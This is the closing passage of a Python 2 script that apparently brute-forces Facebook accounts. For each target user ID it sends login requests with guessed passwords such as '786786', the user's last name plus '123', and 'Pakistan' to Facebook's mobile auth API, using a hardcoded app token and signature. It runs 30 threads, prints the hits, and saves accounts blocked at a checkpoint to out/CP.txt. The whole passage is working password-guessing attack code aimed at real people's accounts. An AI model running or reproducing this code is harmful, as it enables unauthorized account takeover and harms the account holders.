											print '          \x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' ✔ ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' ✔ ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '          \x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' ✔ ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' ✔ ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '          \x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' ✔ ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' ✔ ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '          \x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' ✔ ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()

